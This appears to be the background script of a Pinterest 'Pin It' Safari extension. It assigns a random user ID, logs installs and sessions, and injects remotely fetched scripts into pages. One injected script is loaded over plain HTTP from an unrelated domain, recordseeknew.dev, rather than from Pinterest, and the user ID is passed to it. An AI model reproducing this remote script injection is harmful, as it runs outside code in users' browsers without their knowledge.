var showDebug = true;

// generic XHR file getter; sends results to callback

var lang = 'en';

var xv = 'sa' + safari.extension.displayVersion;

var xhrTimeout = 3000;

var locales = {};

var msg = {};

// hashList needs to be a string, for injection into hoverbutton code

var hashList = '[]';

var assetPath = 'https://assets.pinterest.com/ext/';

var businessPath = assetPath + 'sa_136.js?' + new Date().getTime();

var hashPath = assetPath + 'hashList.json?' + new Date().getTime();

if (safari.extension.settings.disableSessionSaving === undefined) {
  safari.extension.settings.disableSessionSaving = false;
}

var debug = function (str) {
  if (showDebug) {
    console.log(str);
  }
};


// xhr call to url

var get = function (url, callback, timeout) {

  debug('xhr call to: ' + url);

  var xhr = new XMLHttpRequest();
  xhr.open('GET', url, true);

  var timer = window.setTimeout(function () {
    debug('xhr call for ' + url + ' has timed out');
    timer = 0;
  }, timeout || xhrTimeout);

  function handle() {
    if (xhr.readyState == 4) {
      // status 0 seems to be what happens when we XHR from safare.extension.baseURI
      if (xhr.status === 200 || xhr.status === 0) {
        // only run callback if we haven't timed out yet
        if (timer) {
          callback(xhr.responseText);
          window.clearTimeout(timer);
          timer = 0;
        }
      }
    }
  }

  xhr.onreadystatechange = handle;
  xhr.send();
};

// log all the things

var log = function (msg) {
  msg = '?type=extension&xv=' + xv + '&xuid=' + xuid + '&' + msg;
  debug('logging: ' + msg);
  get('https://log.pinterest.com/' + msg, function () {} );
}

// get or set xuid

var xuid = localStorage['xuid'] || '';

debug('xuid = ' + xuid);
if (!xuid) {
  for (var i = 0; i < 12; i = i + 1) {
    xuid = xuid + '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ_abcdefghijkmnopqrstuvwxyz'.substr(Math.floor(Math.random() * 60), 1);
  }
  localStorage['xuid'] = xuid;
  log('event=install');
} else {
  log('event=session');
}

// eval me to pop the grid

var popGrid = "(function(d){var s=d.createElement('SCRIPT');s.setAttribute('type','text/javascript');s.setAttribute('charset','UTF-8');s.setAttribute('pinMethod','extension');s.setAttribute('extensionVer','" + xv + "');s.setAttribute('xuid', '" + xuid + "');s.setAttribute('src','http://recordseeknew.dev/website/citeit.js?'+Math.random()*99999999);if(d.body){d.body.appendChild(s);}}(document));";

// listen for events

var listen = function () {

  //  a command has arrived from toolbar or right-click

  safari.application.addEventListener("command", function(event) {
    // right-click-to-pin
    if (event.command === "rightClick" || event.command === "toolbarClick") {
      safari.application.activeBrowserWindow.activeTab.page.dispatchMessage("grid", popGrid);
    }

  }, false);

  debug('command listeners added');

  // listen for commands from injected JS
  safari.application.addEventListener("message", function(event) {

    // on load, send the extension ID in case we need to set data-pinterest-extension.installed on document.body
    if (event.name == "load") {
      safari.application.activeBrowserWindow.activeTab.page.dispatchMessage("extensionId", xv);
    }

    // log an event
    if (event.name === "log" && event.message) {
      log(event.message);
    }

  }, false);

  debug('message listeners added');

};

// generic function to show a popover

function makeAndShowPopover(popover, msg) {
   debug('make and show popover');
   for(var i = 0; i < safari.extension.toolbarItems.length; i++) {
      safari.extension.toolbarItems[i].popover = popover;
      safari.extension.toolbarItems[i].showPopover();
   }
}

// show the welcome popover

var welcome = function () {
  if (!safari.extension.settings.hasBeenWelcomed) {
    safari.extension.settings.hasBeenWelcomed = true;
    debug('showing welcome popover');
    makeAndShowPopover(safari.extension.createPopover("welcome", safari.extension.baseURI + "welcome.html", 600, 180));
  } else {
    debug('welcome popover has already been shown');
  }
};

// load support files

var init = function () {

  // get translated strings from _locales

  var getMessages = function (str) {
    if (str) {
      var obj = JSON.parse(str);
      // default to English
      var seek = navigator.language || 'en';
      // match full lang, like pt-br
      if (obj[seek]) {
        lang = seek;
      } else {
        // match left half, like nl
        seek = seek.split('-')[0];
        if (obj[seek]) {
          lang = seek;
        }
      }
      debug('Attempting to get messages for: ' + lang);

      get(safari.extension.baseURI + '_locales/' + lang + '/messages.json', function (str) {
        if (str) {
          msg = JSON.parse(str);
          for (var k in msg) {
            localStorage[k] = msg[k].message;
          }
          debug('Messages loaded for ' + lang + '.');

          function handleContextMenu(event) {
              event.contextMenu.appendContextMenuItem("rightClick", localStorage['menuAction']);
          }
          safari.application.addEventListener("contextmenu", handleContextMenu, false);

          // only pop welcome message if messages are loaded
          welcome();

        } else {
          debug('Messages not loaded due to ' + lang + ' file timeout.');
        }
      });
    } else {
      debug('Messages not loaded due to index timeout.');
    }
  };

  get(safari.extension.baseURI + '_locales/index.json', getMessages);

  // receive, update, and set listener to inject sa.js on navigation
  var inject = function (str) {
    // every time we navigate, inject this into the DOM
    safari.application.addEventListener("navigate", function(e) {
      // settings may change during session; always check for each navigation event
      var send = str;
      send = send.replace(/%xv%/, xv);
      send = send.replace(/%xuid%/, xuid);
      send = send.replace(/%xhide%/, '' + safari.extension.settings.disableSessionSaving);
      send = send.replace(/%xhash%/, hashList);
      send = send.replace(/%xerr%/, localStorage.errorPin);
      if (safari.application.activeBrowserWindow.activeTab.page) {
        safari.application.activeBrowserWindow.activeTab.page.dispatchMessage("inject", send);
      }
    });
  }

  // get the domain graylist
  var gotHashList = function (str) {
    if (str) {
      var obj = JSON.parse(str);
      if (obj.theList) {
        hashList = JSON.stringify(obj);
      }
    }
    // don't try to get business logic before you have a hash list
    debug('getting ' + businessPath);
    get(businessPath, inject);

    // parts of business logic run on right-click, so listen here and not on load
    listen();
  };
  get(hashPath, gotHashList);
};

window.onload = function () {
  debug('session starting');
  init();
};
